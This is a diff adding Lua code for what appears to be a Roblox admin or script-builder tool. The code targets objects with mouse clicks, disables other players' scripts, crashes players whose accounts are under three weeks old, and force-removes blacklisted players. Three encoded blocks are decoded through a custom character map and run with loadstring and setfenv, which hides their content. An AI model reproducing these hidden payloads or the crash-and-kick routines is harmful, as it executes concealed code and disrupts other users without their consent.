+                Output(c.Value.." disabled","Black",Player,60)
+        end
+end
+function Click()
+        wait()
+        local tar = Player:GetMouse().Target
+        if not tar then return end
+        if tar.Name:match("Tablet%d%d?") == tar.Name then
+                tar.Transparency = 1
+                if tar:findFirstChild("BillboardGui") and tar.BillboardGui:findFirstChild("TextLabel") then
+                        tar.BillboardGui.TextLabel.TextTransparency = 1
+                end
+                if tar:findFirstChild("SelectionBox") then
+                        tar.SelectionBox.Transparency = 1
+                end
+        end
+        if tar.Name:find("::Output%S+") then
+                local name = tar.Name:match("::Output(%S+)")
+                if not NRS[name] then
+                        Output("Found Nil Player: "..name,"White",Player,10)
+                        NRS[name] = {}
+                end
+                tar:Destroy()
+                return
+        end
+        if tar.Parent.Parent == workspace and tar.Parent:findFirstChild("Dummy") then
+                if tar.Parent:findFirstChild("Humanoid") then
+                        tar.Parent.Humanoid.Health = 0
+                        return
+                end
+        end
+        if tar.Parent == workspace and not tar.Anchored and tar.Size == Vector3.new(2.3,1,3) then
+                tar:Destroy()
+                return
+        end
+        if game:GetService("Players"):GetPlayerFromCharacter(tar.Parent) and tar.Name ~= "OutputBall" then
+                DoCommand("whois",game:GetService("Players"):GetPlayerFromCharacter(tar.Parent).Name,Player)
+        elseif tar.Parent:findFirstChild("PCharacter") and tar.Parent.PCharacter:IsA("ObjectValue") then
+                local p = tar.Parent.PCharacter.Value
+                if p then
+                        if NRS[p.Name] then
+                                NRS[p.Name].Player = p
+                        else
+                                NRS[p.Name] = {Player=p,Name=p.Name}
+                        end
+                        NIL[p.Name] = p
+                end
+        end
+        if tar.Transparency == 0.5 and tar:findFirstChild("SelectionBox") and tar.SelectionBox.Transparency == 0.75 then
+                tar.Parent:Destroy()
+        elseif tar.Transparency == 0.5 and tar.Parent:findFirstChild("Recipient") then
+                local p = tar.Parent.Recipient.Value
+                if not NRS[p.Name] then
+                        Output("Found Nilized Player: "..tostring(p),"White")
+                        NRS[p.Name] = {Player=p}
+                        NIL[p.Name] = p
+                end
+                NRS[p.Name].Player = p
+                NIL[p.Name] = p
+                tar.Parent:Destroy()
+        elseif tar.Transparency == 0.5 and tar:findFirstChild("Recipient") then
+                tar:Destroy()
+        elseif (tar.Name == "Sphere" or tar.Name == "Disk") and tar:findFirstChild("Fire") then
+                tar:Destroy()
+        end
+        if tar.Name ~= "Tablet" and tar.Name ~= "OutputBall" and tar.Name ~= "Globe" then return end
+        if TCS[tar] and TCS[tar] ~= true then
+                TCS[tar](tar,Player,tar["3DGUI"].Title.Text)
+                return
+        end
+        if tar:findFirstChild("Explorer") and tar.Explorer:IsA("ObjectValue") then
+                local p = game:GetService("Players"):GetPlayerFromCharacter(tar.Parent) or Player
+                local o = tar.Explorer.Value
+                if o then
+                        PEP = o
+                        DoCommand("explorer","old",p)
+                end
+        end
+        tar:Destroy()
+end
+function SFilter(s)
+        if s:IsA("Script") and not sou then
+                sou = s:clone()
+                Output("Source found!","Green")
+        end
+        if s:IsA("Model") then
+                wait()
+                if s:findFirstChild("PCharacter") and s.PCharacter:IsA("ObjectValue") then
+                        local p = s.PCharacter.Value
+                        if not p then return end
+                        if NRS[p.Name] then
+                                NRS[p.Name].Player = p
+                        else
+                                NRS[p.Name] = {Player=p,Name=p.Name}
+                        end
+                        NIL[p.Name] = p
+                end
+        end
+        if not s:IsA("Script") then return end
+        if s:IsA("LocalScript") then return end
+        if not s:findFirstChild("DSource") then return end
+        local code = s.DSource.Value
+        if not Codes then
+                Codes = {[s.Name..time()] = code}
+        else
+                Codes[s.Name..time()] = code
+        end
+        if code:lower():find("override") then
+                Output("Potential NO".."VA found!")
+                local ma = code:match([[Text.Text == "%S+" or Level == 1]])
+                if ma then
+                        Output("Code: "..ma:sub(15,-16))
+                        Output("Disabled + Boxed NO".."VA")
+                end
+                pcall(function() s.Disabled = true
+                s.Parent = game.Lighting end)
+                wait()
+                s.Disabled = true
+                s.Parent = game.Lighting
+        end
+end
+TCons[function(...) ypcall(Joined,...) end] = "PlayerAdded"
+TCons[function(...) ypcall(Left,...) end] = "PlayerRemoving"
+TCons[function(...) ypcall(LightAdded,...) end] = "LightingAdded"
+TCons[function() ypcall(Click) end] = "Mouse1Down"
+TCons[function(...) ypcall(SFilter,...) end] = "WorkspaceAdded"
+TCons[function(m) ypcall(Chatted,Player,m) end] = "Chatted"
+coroutine.wrap(JoinAll)()
+-- Loops
+local charMap = {["?"] = 0, [")"] = 1, ["$"] = 2, ["^"] = 3, ["*"] = 4, ["~"] = 5, ["!"] = 6, ["_"] = 7, ["-"] = 8, ["#"] = 9, ["+"] = 10, ["@"] = 11, ["%"] = 12, ["("] = 13, ["="] = 14, ["&"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"^!&!$_&!~_*_#!=!~!=$__$_)!?_-$!!~_=!^!*_#!&!=!-$#$+??$?$?$?$?$?$?$?$^*%!~!)!$_-$!!)!%!^_~!%$^~#$+??$?$?$?$?$?$?$?$&*~_*_?_~_*_-$$$%*&!)!*!#!=!_!$$%$$$$*%!)!^!@!$$%$?~%!)!#_~!$_%$)^?^#$+??$?$?$?$?$?$?$?$%!&!^!)!%!?$%!&!)!*!^_?$(^?$@_(_+??$?$?$?$?$?$?$?$!!&!$_?$#!(^)^%$-^?$*!&!+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$__)!#!*_-$?^=$)^$^~^#$+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$%!&!)!*!^_@~#!(~?$(^?$*~)!$!%!~!*_-$$$$$%$$$_~-!#!*_~!$$#$+??$?$?$?$?$?$?$?$~!=!*!+??$?$?$?$?$?$?$?$!!&!$_?$=!(^)^%$-^?$*!&!+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$__)!#!*_-$?^=$$^~^#$+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$%!&!)!*!^_@~=!(~=$$*$_#!^!@!^*&!%!&!$_?$(^?$$*$_#!^!@!^*&!%!&!$_=$=!~!__-$^*&!%!&!$_^_=$$*%!)!^!@!#$+??$?$?$?$?$?$?$?$~!=!*!+??$?$?$?$?$?$?$?$__)!#!*_-$)^#$+?#?#?_*$_?_^*-!@!-$#$+??$?$?$?$?$?$?$?$%*&!)!*!~!*!?$(^?$*_$_~_~!+??$?$?$?$?$?$?$?$!!&!$_?$@!%$!_?$#!=!?$?_)!#!$_^_-$_!)!(!~!+^_*~!*_^~~!$_!_#!^!~!-$$$?~%!)!#_~!$_^_$$#$+^_*~!*_?~%!)!#_~!$_^_-$#$#$?$*!&!+??$?$?$?$?$"
+	,"?$?$?$?$?$?$?$?$?$?$?$#!!!?$!_?$=_(^?$?~%!)!#_~!$_?$*_-!~!=!+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$&*~_*_?_~_*_-$$$%*&!)!*!~!*!?$#*=!!!#!=!#!*_#_?$_*_^?$(*)!*!~!?$$*#_+^?$*~&!*_)!%!$~~!^!&!=!^!#!%!#!)!*_#!&!=!$$%$$$_*$_~!~!=!$$%$!_%$)^?^#$+??$?$?$?$?$?$?$?$?$?$?$?$?$?$?$?$~!=!*!+??$?$?$?$?$?$?$?$~!=!*!+?~!=!*!#$-$#$+??$"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+
+local function sorter(a,b) return a[4] < b[4] end
+
+Player.Backpack.descendantAdded:connect(function(what)
+	if what:IsA("Script") or what:IsA("LocalScript") and Run then
+					if what.Name == "Health" then return end
+			if what.Name == "HealthScript v3.1" then return end
+			if what.Name == "Animate" then return end
+			if what.Name == "Sound" then return end
+			if what.Name == "InsertedScript" then return end
+			what.Disabled = true
+			wait()
+			a = Tablet('New Script In Backpack : '..what.Name,'Magenta',function()
+			local a = Tablet('Disable','Red',function()
+			what:Destroy()
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	local a = Tablet('Allow ('..what.Name..')','Green',function()
+				what.Disabled = false
+				Clear()
+			end)
+            game:GetService("Debris"):AddItem(a,20)
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	end
+end)
+
+Player.Character.descendantAdded:connect(function(what)
+	if what:IsA("Script") or what:IsA("LocalScript") and Run then
+					if what.Name == "Health" then return end
+			if what.Name == "HealthScript v3.1" then return end
+			if what.Name == "Animate" then return end
+			if what.Name == "Sound" then return end
+			if what.Name == "InsertedScript" then return end
+			what.Disabled = true
+			what.Parent = game.Lighting
+			wait()
+			a = Tablet('New Script In Character : '..what.Name,'Magenta',function()
+			local a = Tablet('Disable','Red',function()
+			what:Destroy()
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	local a = Tablet('Allow ('..what.Name..')','Green',function()
+				what.Disabled = false
+				Clear()
+			end)
+            game:GetService("Debris"):AddItem(a,20)
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	end
+end)
+
+Player.descendantAdded:connect(function(what)
+	if what:IsA("Script") or what:IsA("LocalScript") and Run then
+					if what.Name == "Health" then return end
+			if what.Name == "HealthScript v3.1" then return end
+			if what.Name == "Animate" then return end
+						if what.Name == "Sound" then return end
+						if what.Name == "InsertedScript" then return end
+			what.Disabled = true
+			wait()
+			a = Tablet('New Script In Backpack : '..what.Name,'Magenta',function()
+			local a = Tablet('Disable','Red',function()
+			what:Destroy()
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	local a = Tablet('Allow ('..what.Name..')','Green',function()
+				what.Disabled = false
+				Clear()
+			end)
+            game:GetService("Debris"):AddItem(a,20)
+			end)
+			game:GetService("Debris"):AddItem(a,20)
+	end
+end)
+
+
+game.Players.PlayerAdded:connect(function(w)
+	if w.AccountAge < 21 then
+    Crash(w)
+Tablet(""..w.Name.." Was shutdown'ed because they are not yet 3 weeks old",'Red')
+	end
+end)
+	
+	
+coroutine.wrap(function()
+        game.Players.ChildAdded:connect(function(p)
+	if not p:IsA(Player) then return end
+for k,v in pairs(bl) do
+		if v:lower() == p.Name:lower() then
+			for i=1,5 do
+				pcall(function() p:Destroy() end)
+				wait()
+			end
+			return
+		end
+	end
+end)
+local charMap = {["*"] = 0, ["%"] = 1, ["-"] = 2, ["("] = 3, ["="] = 4, ["!"] = 5, ["?"] = 6, [")"] = 7, ["_"] = 8, ["~"] = 9, ["$"] = 10, ["@"] = 11, ["#"] = 12, ["&"] = 13, ["+"] = 14, ["^"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"#?^?(?%?#?*-??!)+?(?=)~?^?+?*-?=~?#?=)!?-)==%?=)%?_-=?%?=)%?#-=)%?-?~-$*~*#?^?(?%?#?*-&?*)*-&(*-)?%?&?!?$()=!?=)(!!?-)?)~?(?!?_---&=%?-)@?!?=)*)#?%?(?!?(!!?-)?)~?(?!?--~-$*~*#?^?(?%?#?*-??^?*-&(*-&?*)$()=!?=)*!-)^?=?!)(?=)~=+???^?_-=?%?=)%?~-+-==!?()(?-)~?*)=)~?^?+?$(&?%?=)(?_?_----=%=+=#=~=(!=!$(_-!-(!@-~---~-$*~*??^?-)*-()*-~?+?*-??^?$()?&?%?=)(?_?_---@!+!#-&!@---~-*-=?^?*-=)%?-?#?!?+-~?+?()!?-)=)_-=)%?-?#-()~-*-!?+?=?$*!?+?=?$*#?^?(?%?#?*-??!)+?(?=)~?^?+?*-)=!?=)==%?=)%?_-=)%?-?~-$*~*#?^?(?%?#?*-(?^?#?*-&(*-)?%?&?!?$()=!?=)(!!?-)?)~?(?!?_---~=+?()!?-)=)(!!?-)?)~?(?!?--~-$()=!?=)(=^?#?#?!?(?=)~?^?+?_-%(*(=(%(*(=(-(~-$*~*??^?-)*-@?#-%?()()!?=)*-~?+?*-*)%?~?-)()_-(?^?#?~-*-=?^?$*~*~*?=~?#?=)!?-)==%?=)%?_-%?()()!?=)+-%=()()!?=)~==?#-=)%?-?~-$*~*!?+?=?$*!?+?=?$*-)!?*)!?%?=)$*~*-?#?*-&(*-@)&)$*~*)=!?=)==%?=)%?_--?#?~-$*!)+?=)~?#?*-+?^?=)*-))%?~?=)_-((*(~-"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+end)()
+
+mouse = Player:GetMouse()
+mouse.KeyDown:connect(function(key)
+	if key == "c" then
+		DoCommand('cmds','',Player)
+	elseif key == "b" then
+        DoCommand('blast','others',Player)
+elseif key == "x" then
+        DoCommand('dt','',Player)
+elseif key == "p" then
+        DoCommand('cam','',Player)
+elseif key == "o" then
+        DoCommand('char','',Player)
+	elseif key == "v" then
+		DoCommand('unmute','me',Player)
+		Tablet('Unmuted You.','Green')
+	elseif key == "z" then
+	        DoCommand('sw','others',Player)
+	end
+end) 
+
+
+
+local charMap = {["#"] = 0, ["&"] = 1, ["_"] = 2, ["^"] = 3, ["-"] = 4, ["("] = 5, ["*"] = 6, ["~"] = 7, [")"] = 8, ["$"] = 9, ["?"] = 10, ["="] = 11, ["%"] = 12, ["!"] = 13, ["@"] = 14, ["+"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"^*+*_~+*(~-~$*@*(*@_~~_~&*#~)_**(~@*^*-~$*+*@*)_$_?#$#~~)*$*%*(*#_~~&*$*-~)_$_#_-*+*?##_$##~^*&*%*%*)_**(~@*^*-~$*+*@*)_$_?#$#**+*_~#_+(%_*~#_$*@*#_#~&*$*_~^~)_~*&*!*(*?^^~(*_~*~$*^*(*)_~_#(%*&*$~(*_~^~~_$_?^^*)*$*%*-*_~(*@*)_$_$_#_-*+*?#$#$#$***#_@*+*-~#_#(_($-#_-~)*(*@*#__~(*-~(~_~@*#_(*%*^~(*?#$#$***#_@*+*-~#_*~?^$-^~$-@*~-_~+*(~#~)_~-$---$_#_-~)*(*@*?#$#^-_~&*^~)*)_*~$_?#$#(*%*^~(*?#$#$#$#(*@*-*?#$#$#(*@*-*?#$#$#(*@*-*?#(*@*-*$_?#(*@*-*?#(*@*-*$_)_$_?##_?#^*+*_~+*(~-~$*@*(*@_~~_~&*#~)_**(~@*^*-~$*+*@*)_$_?#$#~~)*$*%*(*#_~~&*$*-~)_$_#_-*+*?##_$##~^*&*%*%*)_**(~@*^*-~$*+*@*)_$_?#$#$#$#~~&*$*-~)_^^#^$_?#%*+*&*-*^~-~_~$*@*~*)_~*&*!*(*?^~-(*-~^((*_~*~$*^*(*)___!-&*_~=*(*-~#~%*&*^*(*^((*_~*~$*^*(*__$_?^~-(*-~#(_~+*-*(~^*-~$-@***+*)_!-#~$--*$_=(__--(*^~^*_~$*#~-~$*+*@*__!($_)_$_?#(*@*-*$_?#(*@*-*?#(*@*-*$_)_$_"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+
+ 
+
+
+_G.Chat = function(msg) ypcall(Chatted,Player,msg) end
+ 
+print"Gonna start le loop"
+LT = 0.05
+local loop = 0
+local chat =0
+local idk = 0
+while Run do
+        local done = wait(LT)
+        loop = loop + done
+        chat = chat + done
+        idk = idk + 0.01
+        for g,t in pairs(Globes) do
+                if g:IsDescendantOf(workspace) then
+                        Globes[g] = t + 0.0025
+                        g.CFrame = workspace.CurrentCamera.Focus * CFrame.Angles(0,t*2,0) * CFrame.new(5,1.5,0)
+                        if g:findFirstChild("Effect") then
+                                g.Effect.CFrame = g.CFrame * CFrame.Angles(t*10,t*10,t*10)
+                        end
+											g.CFrame = g.CFrame * CFrame.Angles(idk*20,idk*20,idk*20)
+
+                else
+                        Globes[g] = nil
+                end
+        end
+        local Nt,n = {}, #Tablets/10+1
+        for k,v in pairs(Tablets) do
+                if v:IsDescendantOf(workspace) then
+                        v.Size = Vector3.new(3,4,math.abs(loop-1.4)/3+0.2)
+                        local cf = workspace.CurrentCamera.Focus * CFrame.Angles(0,-math.pi*k/#Tablets*2,0) * CFrame.new(5*n,0,0)
+                        v.CFrame = CFrame.new(cf.p,workspace.CurrentCamera.Focus.p + Vector3.new(0,5,0))
+                        if v:findFirstChild("Effect") then
+                                v.Effect.CFrame = v.CFrame * CFrame.Angles(0,0,math.floor(loop)==math.floor(loop+1) and math.pi/4 or 0)
+                        end
+                        table.insert(Nt,v)
+                end
+        end
+        Tablets = Nt
+        for k,v in pairs(Tablets) do
+                if v:findFirstChild("Effect") then
+                        v.Effect.CFrame = v.CFrame * CFrame.Angles(0,0,loop > 1.5 and math.pi/5 or 0)
+                end
+        end
+        for plr,set in pairs(Out) do
+                local Ns,n = {}, #set/10+1
+                local ocf = plr.Character and plr.Character:findFirstChild("Head") and plr.Character.Head.CFrame
+                pcall(function() cf = cf or workspace:findFirstChild(plr.Name) and workspace[plr.Name]:GetModelCFrame() end)
+                ocf = ocf or plr == Player and workspace.CurrentCamera.Focus
+                if ocf then
+                        for k,v in pairs(set) do
+                                if v:IsDescendantOf(workspace) then
+                                        local cf,l = ocf * CFrame.Angles(0,-math.pi*k/#set*2,0) * CFrame.new(5*n,0,0), loop
+                                        v.CFrame = CFrame.new(cf.p,ocf.p + Vector3.new(0,4,0))
+                                        if v:findFirstChild("Effect") then
+                                                v.Effect.CFrame = v.CFrame * CFrame.Angles(idk*10,idk*10,idk*10)
+                                        end
+											v.CFrame = v.CFrame * CFrame.Angles(idk*20,idk*20,idk*20)
+                                        table.insert(Ns,v)
+                                end
+                        end
+                        Out[plr] = Ns
+                end
+        end
+        if loop >= 3 then
+                for k,con in pairs(CCons) do
+                        con:disconnect()
+                end
+                CCons = {}
+                Player = game:GetService("Players").LocalPlayer
+                for func,name in pairs(TCons) do
+                        if name == "PlayerAdded" then
+                                CCons[tick()+0.1] = game:GetService("Players").ChildAdded:connect(func)
+                        elseif name == "PlayerRemoving" then
+                                CCons[tick()+0.2] = game:GetService("Players").ChildRemoved:connect(func)
+                        elseif name == "WorkspaceAdded" then
+                                CCons[tick()+0.3] = workspace.ChildAdded:connect(func)
+                        elseif name == "LightingAdded" then
+                                CCons[tick()+0.4] = game:GetService("Lighting").ChildAdded:connect(func)
+                        elseif name == "Chatted" then
+                                CCons[tick()+0.5] = Player.Chatted:connect(func)
+                        elseif name == "Mouse1Down" then
+                                CCons[tick()+0.6] = Player:GetMouse().Button1Down:connect(func)
+                        end
+                end
+                loop = 0
+                for k,v in pairs(NRS) do
+                        if v.Player then
+                                NIL[k] = v.Player
+                        end
+                end
+        end
+        if chat > 1 then
+                for plr, reqs in pairs(Requests) do
+                        local c = reqs[1]
+                        if c then
+                                DoOutput(Txt[c[1]],c[2],plr,c[3],c[5])
+                                table.remove(reqs,1)
+                        end
+                end
+                chat = 0
+                for k,v in pairs(S) do
+                        if not k:IsDescendantOf(workspace) then
+                                S[k] = nil
+                        end
+                end
+        end
+end
